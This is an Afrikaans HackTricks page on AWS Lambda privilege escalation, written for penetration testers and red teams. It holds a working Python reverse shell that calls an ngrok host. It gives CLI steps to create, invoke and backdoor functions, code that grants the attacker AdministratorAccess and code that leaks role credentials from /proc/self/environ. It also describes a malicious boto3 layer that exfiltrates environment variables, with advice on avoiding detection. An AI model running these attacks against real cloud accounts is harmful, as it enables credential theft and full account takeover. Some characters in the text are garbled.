# AWS - Lambda Privesc

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## lambda

Meer inligting oor lambda in:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Gebruikers met die **`iam:PassRole`, `lambda:CreateFunction`, en `lambda:InvokeFunction`**-permissies kan hul bevoegdhede verhoog.\
Hulle kan 'n **nuwe Lambda-funksie skep en dit 'n bestaande IAM-rol toewys**, wat die funksie die bevoegdhede wat met daardie rol geassosieer word, verleen. Die gebruiker kan dan **kode skryf en oplaai na hierdie Lambda-funksie (met 'n omgekeerde skulp byvoorbeeld)**.\
Sodra die funksie opgestel is, kan die gebruiker **sy uitvoering teweegbring** en die beoogde aksies deur die Lambda-funksie te roep deur die AWS API. Hierdie benadering maak dit effektief vir die gebruiker om take indirek deur die Lambda-funksie uit te voer, met die vlak van toegang wat aan die IAM-rol wat daarmee geassosieer is, verleen word.\


'n Aanvaller kan dit misbruik om 'n **omgekeerde skulp te kry en die token te steel**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Jy kan ook **misbruik maak van die lambda rol se regte** vanuit die lambda funksie self. As die lambda rol genoeg regte het, kan jy dit gebruik om administratiewe regte aan jou toe te ken:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Dit is ook moontlik om die legitimasie van die lambda se rol te lek sonder om 'n eksterne verbinding nodig te h√™. Dit sal nuttig wees vir **Netwerk ge√Øsoleerde Lambdas** wat gebruik word vir interne take. As daar onbekende sekuriteitsgroepe is wat jou omgekeerde skulpe filter, sal hierdie stuk kode jou in staat stel om die legitimasie direk as die uitset van die lambda te lek.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potensi√´le Impak:** Direkte voorregte-escalasie na die willekeurige lambda-diensrol wat gespesifiseer is.

{% hint style="danger" %}
Let daarop dat selfs al lyk dit interessant, **`lambda:InvokeAsync`** **nie** op sy eie toelaat om **`aws lambda invoke-async`** uit te voer nie, jy benodig ook `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Soos in die vorige scenario, kan jy jouself die `lambda:InvokeFunction`-toestemming gee as jy die toestemming **`lambda:AddPermission`** het.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potensi√´le Impak:** Direkte voorregte-escalasie na die arbitr√™re lambda-diensrol wat gespesifiseer is.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Gebruikers met die **`iam:PassRole`, `lambda:CreateFunction`, en `lambda:CreateEventSourceMapping`** toestemmings (en moontlik `dynamodb:PutItem` en `dynamodb:CreateTable`) kan indirek **voorregte verhoog** selfs sonder `lambda:InvokeFunction`. Hulle kan 'n **Lambda-funksie met skadelike kode skep en dit toewys aan 'n bestaande IAM-rol**.

In plaas daarvan om die Lambda direk aan te roep, stel die gebruiker 'n bestaande DynamoDB-tabel op of gebruik dit, en koppel dit aan die Lambda deur middel van 'n gebeurtenisbronkartering. Hierdie opset verseker dat die Lambda-funksie outomaties geaktiveer word wanneer 'n nuwe item in die tabel ingevoer word, √≥f deur die aksie van die gebruiker √≥f deur 'n ander proses, en sodoende die Lambda-funksie indirek aanroep en die kode uitvoer met die voorregte van die oorgedraagde IAM-rol.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
As DynamoDB reeds aktief is in die AWS-omgewing, moet die gebruiker slegs die gebeurtenisbronkartering vir die Lambda-funksie **vestig**. Indien DynamoDB egter nie gebruik word nie, moet die gebruiker **'n nuwe tabel skep** met streaming wat geaktiveer is:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Nou is dit moontlik om die Lambda-funksie aan die DynamoDB-tabel te koppel deur 'n gebeurtenisbronkartering te skep:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Met die Lambda-funksie wat gekoppel is aan die DynamoDB-stroom, kan die aanvaller die Lambda **indirek aktiveer deur die DynamoDB-stroom te aktiveer**. Dit kan bereik word deur **'n item in te voeg** in die DynamoDB-tabel:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potensi√´le Impak:** Direkte bevoorregte toegang tot die gespesifiseerde lambda-diensrol.

### `lambda:AddPermission`

'n Aanvaller met hierdie toestemming kan homself (of ander) enige toestemmings **toeken** (dit genereer beleide gebaseer op hulpbronne om toegang tot die hulpbron te verleen):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potensi√´le Impak:** Direkte privilege-escalation na die lambda-diensrol deur toestemming te verleen om die kode te wysig en uit te voer.

### `lambda:AddLayerVersionPermission`

'n Aanvaller met hierdie toestemming kan **homself (of ander) die toestemming `lambda:GetLayerVersion` gee**. Hy kan toegang verkry tot die laag en soek na kwesbaarhede of sensitiewe inligting.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potensi√´le Impak:** Potensi√´le toegang tot sensitiewe inligting.

### `lambda:UpdateFunctionCode`

Gebruikers wat die **`lambda:UpdateFunctionCode`** toestemming het, het die potensiaal om **die kode van 'n bestaande Lambda-funksie wat gekoppel is aan 'n IAM-rol te wysig.**\
Die aanvaller kan **die kode van die lambda wysig om die IAM-legitimasie uit te voer**.

Alhoewel die aanvaller moontlik nie die direkte vermo√´ het om die funksie aan te roep nie, as die Lambda-funksie vooraf bestaan en operasioneel is, is dit waarskynlik dat dit deur bestaande werkstrome of gebeure geaktiveer sal word, wat dus die uitvoering van die gewysigde kode indirek fasiliteer.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potensi√´le Impak:** Direkte voorregte-escalasie na die gebruikte lambda-diensrol.

### `lambda:UpdateFunctionConfiguration`

#### Inleiding

[**Lambda-lae**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) maak dit moontlik om **kode** in jou lambda-funksie in te sluit, maar om dit **afsonderlik te stoor**, sodat die funksiekode klein kan bly en **verskeie funksies kode kan deel**.

Binne lambda kan jy die paaie waarvandaan Python-kode gelaai word, nagaan met 'n funksie soos die volgende:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Hier is die plekke:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Byvoorbeeld, die biblioteek boto3 word gelaai vanaf `/var/runtime/boto3` (4de posisie).

#### Uitbuiting

**Die aanheg van 'n laag aan 'n funksie** vereis slegs die `lambda:UpdateFunctionConfiguration` toestemming en **lae kan oor rekeninge gedeel word**. Ons moet ook weet **watter biblioteke hulle gebruik**, sodat ons hulle korrek kan oorskryf, maar in hierdie voorbeeld sal ons net **aanneem dat die aangevalle funksie boto3 invoer**.

Net om veilig te wees, gaan ons Pip gebruik om dieselfde weergawe van die boto3-biblioteek van die Lambda-runtym te installeer waarna ons mik (Python 3.7), sodat daar niks anders is wat probleme in die teikengroep kan veroorsaak nie. Hierdie runtym gebruik tans boto3 weergawe 1.9.42.

Met die volgende kode sal ons boto3 weergawe 1.9.42 en sy afhanklikhede na 'n plaaslike "lambda\_layer" vouer installeer:
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Volgende, sal ons `/lambda_layer/boto3/__init__.py` oopmaak en die skadelike kode byvoeg. Die payload wat ons sal byvoeg, lyk soos volg:

![](<../../../.gitbook/assets/image (26).png>)

`requests` word ingevoer vanaf `botocore`. Die funksie sal omgewingsveranderlikes eksfiltreer, en die try-except en 0.1 timeout is daar om te verseker dat hierdie kode niks breek nie.

{% hint style="info" %}
**Belangrike nota:** Jy moet nie meer `from botocore.vendored import requests` in werklike pentests gebruik nie, omdat 'n "DeprecationWarning" na die CloudWatch-logboeke van daardie funksie gedruk sal word, wat waarskynlik sal veroorsaak dat jy deur 'n verdediger gevang word.
{% endhint %}

Maak nou daardie kode in 'n **ZIP-l√™er** en **laai** dit op na 'n **nuwe Lambda-laag in die AANVALLER-rekening**. Jy sal eers 'n "python" -vouer moet skep en jou biblioteke daar plaas sodat, sodra ons dit na Lambda oplaai, die kode by " /opt/python/boto3 " gevind sal word. Maak ook seker dat die laag versoenbaar is met Python 3.7 en dat die **laag in dieselfde streek as ons teikengreep-funksie is**. Sodra dit gedoen is, sal ons `lambda:AddLayerVersionPermission` gebruik om die laag **openbaar toeganklik** te maak sodat ons teikengreep-rekening dit kan gebruik. Gebruik jou persoonlike AWS-legitimasie vir hierdie API-oproep.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Nou met die **gekompromitteerde geloofsbriewe** wat ons het, sal ons die volgende bevel uitvoer op ons teiken Lambda-funksie "s3-getter", wat ons kruisrekening Lambda-laag sal **aanheg**.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
Die volgende stap sou wees om √≥f die funksie self te **aanroep** as ons kan, √≥f om te wag totdat dit op normale wyse aangeroep word - wat die veiliger metode is.

'n **Meer heimlike manier om hierdie kwesbaarheid uit te buit**, kan gevind word in:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potensi√´le Impak:** Direkte voorregverhoging na die gebruikte lambda-diensrol.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Miskien kan jy met daardie toestemmings 'n funksie skep en dit uitvoer deur die URL te roep... maar ek kon nie 'n manier vind om dit te toets nie, so laat weet my as jy dit doen!

### Lambda MitM

Sommige lambdas gaan **sensitiewe inligting van gebruikers in parameters ontvang.** As jy RCE in een van hulle kry, kan jy die inligting wat ander gebruikers na dit stuur, uitlek, kyk dit na:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Verwysings

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks in PDF aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
